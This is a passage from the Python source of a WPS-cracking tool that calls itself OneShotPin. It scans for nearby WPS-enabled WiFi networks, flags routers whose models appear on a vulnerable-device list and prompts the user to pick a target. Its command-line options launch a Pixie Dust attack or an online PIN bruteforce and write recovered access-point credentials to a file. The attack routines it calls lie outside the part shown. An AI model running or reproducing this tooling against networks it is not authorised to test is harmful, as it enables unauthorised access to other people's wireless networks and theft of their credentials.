        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='ignore')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN':
                    sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA':
                    sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            d = result.group(1)
            networks[-1]['Model'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='ignore')

        def handle_modelNumber(line, result, networks):
            d = result.group(1)
            networks[-1]['Model number'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='ignore')

        def handle_deviceName(line, result, networks):
            d = result.group(1)
            networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='ignore')

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8')
        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        # Filtering non-WPS networks
        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        # Sorting by signal level
        networks.sort(key=lambda x: x['Level'], reverse=True)

        # Printing scanning results as table
        def truncateStr(s, l, postfix='…'):
            '''
            Truncate string with the specified length
            @s — input string
            @l — length of output string
            '''
            if len(s) > l:
                k = l - len(postfix)
                s = s[:k] + postfix
            return s

        def colored(text, color=None):
            '''Returns colored text'''
            if color:
                if color == 'green':
                    text = '\033[92m{}\033[00m'.format(text)
                elif color == 'red':
                    text = '\033[91m{}\033[00m'.format(text)
                elif color == 'yellow':
                    text = '\033[93m{}\033[00m'.format(text)
                else:
                    return text
            else:
                return text
            return text
        if vuln_list:
            print(colored('Green', color='green'), '— possible vulnerable network',
                  '\n' + colored('Red', color='red'), '— WPS locked',
                  '\n' + colored('Yellow', color='yellow'), '— already stored')
        print('Networks list:')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
        for i, network in enumerate(networks):
            number = '{})'.format(i + 1)
            model = '{} {}'.format(network['Model'], network['Model number'])
            essid = truncateStr(network['ESSID'], 25)
            deviceName = truncateStr(network['Device name'], 27)
            line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
                number, network['BSSID'], essid,
                network['Security type'], network['Level'],
                deviceName, model
                )
            if network['WPS locked']:
                print(colored(line, color='red'))
            elif (network['BSSID'], network['ESSID']) in self.stored:
                print(colored(line, color='yellow'))
            elif vuln_list and (model in vuln_list):
                print(colored(line, color='green'))
            else:
                print(line)

        return networks

    def prompt_network(self):
        networks = self.iw_scanner()
        if not networks:
            print('[-] No networks found.')
            return
        while 1:
            try:
                networkNo = input('Select target ("r" for refresh): ')
                if networkNo.lower() == 'r':
                    return self.prompt_network()
                elif int(networkNo) in range(1, len(networks) + 1):
                    return networks[int(networkNo) - 1]['BSSID']
                else:
                    raise IndexError
            except Exception:
                print('Invalid number')
            else:
                break


def ifaceUp(iface, down=False):
    if down:
        action = 'down'
    else:
        action = 'up'
    cmd = 'ip link set {} {}'.format(iface, action)
    res = subprocess.run(cmd, shell=True, stdout=sys.stdout, stderr=sys.stdout)
    if res.returncode == 0:
        return True
    else:
        return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    return """
OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg

%(prog)s <arguments>

Required arguments:
    -i, --interface=<wlan0>  : Name of the interface to use

Optional arguments:
    -b, --bssid=<mac>        : BSSID of the target AP
    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         : Run Pixie Dust attack
    -B, --bruteforce         : Run online bruteforce attack

Advanced arguments:
    -d, --delay=<n>          : Set the delay between pin attempts [0]
    -w, --write              : Write AP credentials to the file on success
    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
    -X, --show-pixie-cmd     : Alway print Pixiewps command
    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
    --iface-down             : Down network interface when the work is finished
    -v, --verbose            : Verbose output

Example:
    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
"""


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg',
        epilog='Example: {} -i wlan0 -b 00:90:4C:C1:AC:21 -K'.format(sys.argv[0])
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Alway print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose output'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
        )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    if os.getuid() != 0:
        die("Run it as root")

    if not ifaceUp(args.interface):
        die('Unable to up interface "{}"'.format(args.interface))

    try:
        if not args.bssid:
            try:
                with open(args.vuln_list, 'r', encoding='utf-8') as file:
                    vuln_list = file.read().splitlines()
            except FileNotFoundError:
                vuln_list = []
            scanner = WiFiScanner(args.interface, vuln_list)
            print('[*] BSSID not specified (--bssid) — scanning for available networks')
            args.bssid = scanner.prompt_network()

        if args.bssid:
            companion = Companion(args.interface, args.write, print_debug=args.verbose)
            if args.bruteforce:
                companion.smart_bruteforce(args.bssid, args.pin, args.delay)
            else:
                companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                            args.show_pixie_cmd, args.pixie_force)
    except KeyboardInterrupt:
        print("\nAborting…")

    if args.iface_down:
        ifaceUp(args.interface, down=True)
